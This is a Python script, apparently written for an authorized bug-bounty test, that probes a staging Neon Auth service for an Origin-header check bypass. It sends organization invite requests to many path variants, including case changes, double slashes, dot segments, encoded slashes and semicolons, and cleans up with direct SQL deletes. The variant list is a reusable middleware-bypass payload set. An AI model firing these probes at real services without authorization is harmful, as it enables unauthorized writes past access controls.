# -*- coding: utf-8 -*-
"""V20: path-normalization bypass of Origin middleware (LAST blind class).
V13 tested Origin check on CANONICAL paths only. If auth middleware matches
prefix literally but router normalizes (case/trailing-slash/double-slash/
URL-encoding), variant paths may reach handlers WITHOUT Origin check.
Probe: invite-member (write, needs origin) + list-invitations via variants
with NO Origin header. 200/400-body (not 403 MISSING_ORIGIN) = bypass."""
import json, ssl, time, http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]
ctx = ssl.create_default_context()
DB_URI = None
PASS = "SecTest!2026pass"
U1 = "libobo1229+na_org1@gmail.com"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na(method, path, body=None, cookie=None, origin=None, timeout=25):
    try:
        conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
        payload = json.dumps(body) if body is not None else None
        hdrs = {"Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0", "Accept": "application/json",
                "X-Bug-Bounty": "xxbo"}
        if origin is not None:
            hdrs["Origin"] = origin
        if cookie:
            hdrs["Cookie"] = cookie
        conn.request(method, path, body=payload, headers=hdrs)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        ck = resp.getheader("Set-Cookie", "")
        conn.close()
        time.sleep(0.3)
        return resp.status, data, ck
    except Exception as e:
        time.sleep(0.3)
        return None, str(e)[:120], ""


def auth(email, pw=PASS):
    st, data, ck = na("POST", "/neondb/auth/sign-in/email",
                      {"email": email, "password": pw})
    return ck.split(";")[0] if st in (200, 201) else None


def fetch_db_uri():
    global DB_URI
    conn = http.client.HTTPSConnection(API_HOST, timeout=30, context=ctx)
    conn.request("GET", API_BASE + "/projects/%s/connection_uri?database_name=neondb"
                 "&role_name=neondb_owner&branch_id=%s" % (PA, PAMAIN),
                 headers={"X-Bug-Bounty": "xxbo", "Authorization": "Bearer " + APIKEY})
    resp = conn.getresponse()
    data = json.loads(resp.read().decode("utf-8", "replace"))
    conn.close()
    uri = data.get("uri")
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    parts = urlsplit(uri)
    q = [(k, v) for k, v in parse_qsl(parts.query) if k != "channel_binding"]
    DB_URI = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))


def dbq(sql):
    import psycopg
    with psycopg.connect(DB_URI, connect_timeout=15) as conn:
        conn.autocommit = True
        with conn.cursor() as cur:
            cur.execute(sql)
            if cur.description is None:
                return None
            return cur.fetchall()


def main():
    out("== V20 path-normalization bypass of Origin middleware ==")
    fetch_db_uri()
    c1 = auth(U1)
    out("cookie: %s" % bool(c1))
    if not c1:
        return
    st, d, _ = na("POST", "/neondb/auth/organization/create",
                  {"name": "v20-org", "slug": "v20%d" % int(time.time())}, c1, origin="http://localhost:3000")
    org = json.loads(d).get("id") if st == 200 else None
    out("org=%s" % org)
    if not org:
        return
    once = "libobo1229+v20%s@gmail.com" % (str(int(time.time()))[-6:])
    body = {"organizationId": org, "email": once, "role": "member"}
    base = "/neondb/auth/organization/invite-member"
    variants = [
        ("canonical ctrl+origin", base, "http://localhost:3000"),
        ("canonical no-origin", base, None),
        ("UPPER", "/neondb/auth/ORGANIZATION/invite-member", None),
        ("mixed case", "/neondb/auth/Organization/Invite-Member", None),
        ("trailing /", base + "/", None),
        ("double //", "/neondb//auth/organization/invite-member", None),
        ("auth//org", "/neondb/auth//organization/invite-member", None),
        ("%2e org", "/neondb/auth/organization/./invite-member", None),
        ("..", "/neondb/auth/other/../organization/invite-member", None),
        ("enc org", "/neondb/auth/organization%2Finvite-member", None),
        ("enc slash", "/neondb/auth%2Forganization/invite-member", None),
        ("semicolon", base + ";x=1", None),
        ("query", base + "?x=1", None),
        ("fragment-ish", base + "#x", None),
        ("dup slash mid", "/neondb/auth/organization//invite-member", None),
        ("tab", "/neondb/auth/organization/invite-member\t", None),
    ]
    for tag, path, ov in variants:
        st, d, _ = na("POST", path, body, c1, origin=ov)
        # 200 or body-validation(400 not MISSING_ORIGIN) = reached handler
        note = ""
        if st not in (403, 404) or (st == 403 and "ORIGIN" not in d):
            note = "  <<< reached handler?"
        out("%-24s -> %d %s%s" % (tag, st, d[:110], note))
    # get-side origin check on token (known: no check) via variants
    st, d, _ = na("GET", "/neondb/auth/token", c1)
    out("token ctrl -> %d" % st)
    # cleanup: delete org + invitation rows
    st, d, _ = na("POST", "/neondb/auth/organization/delete", {"organizationId": org}, c1, origin="http://localhost:3000")
    out("cleanup delete -> %d" % st)
    dbq('DELETE FROM neon_auth.invitation WHERE "organizationId"=%s' % ("'" + org + "'"))
    dbq('DELETE FROM neon_auth.member WHERE "organizationId"=%s' % ("'" + org + "'"))
    out("done")


if __name__ == "__main__":
    main()
